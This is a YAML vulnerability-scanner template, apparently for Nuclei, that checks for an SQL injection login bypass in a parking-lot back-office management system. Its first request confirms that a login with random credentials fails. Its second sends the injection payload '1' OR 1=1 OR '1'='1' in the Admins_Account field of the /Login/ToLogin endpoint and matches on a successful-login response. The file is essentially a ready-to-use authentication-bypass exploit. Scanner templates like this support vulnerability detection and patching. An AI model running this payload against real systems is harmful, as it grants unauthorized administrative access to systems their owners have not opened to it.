id: poc-yaml-safirm-login-sqli
info:
  name: 停车场后台管理系统 ToLogin SQL注入任意登录漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
variables:
  t1: "{{rand_int(1000, 999000)}}"
  t2: "{{rand_int(100, 1000)}}"
http:
  - raw:
      - |
        POST /Login/ToLogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        Admins_Account={{t1}}&Admins_Pwd={{t2}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"Success\":false"
      - type: word
        part: header
        words:
          - "application/json"

  - raw:
      - |
        POST /Login/ToLogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        Admins_Account=1' OR 1=1 OR '1'='1&Admins_Pwd=
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"Success\":true"
          - "\"Message\":\"登录成功\""
      - type: word
        part: header
        words:
          - "application/json"
